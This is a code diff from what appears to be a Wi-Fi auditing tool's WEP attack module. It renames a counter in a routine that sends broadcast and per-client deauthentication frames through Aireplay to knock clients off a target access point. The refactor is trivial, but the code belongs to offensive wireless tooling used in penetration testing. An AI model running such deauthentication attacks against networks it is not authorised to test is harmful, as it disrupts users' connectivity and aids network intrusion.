@@ -264,7 +264,7 @@ class AttackWEP(Attack):
 
         if answer == 1:
             # Deauth clients & retry
-            num_deauths = 1
+            deauth_count = 1
             Color.clear_entire_line()
             Color.p("\r{+} {O}Deauthenticating *broadcast*{W} (all clients)...")
             Aireplay.deauth(target.bssid, essid=target.essid)
@@ -272,9 +272,9 @@ class AttackWEP(Attack):
                 Color.clear_entire_line()
                 Color.p("\r{+} {O}Deauthenticating client {C}%s{W}..." % client.station)
                 Aireplay.deauth(target.bssid, client_mac=client.station, essid=target.essid)
-                num_deauths += 1
+                deauth_count += 1
             Color.clear_entire_line()
-            Color.pl("\r{+} Sent {C}%d {O}deauths{W}" % num_deauths)
+            Color.pl("\r{+} Sent {C}%d {O}deauths{W}" % deauth_count)
             # Re-insert current attack to top of list of attacks remaining
             attacks_remaining.insert(0, current_attack)
             return False # Don't stop
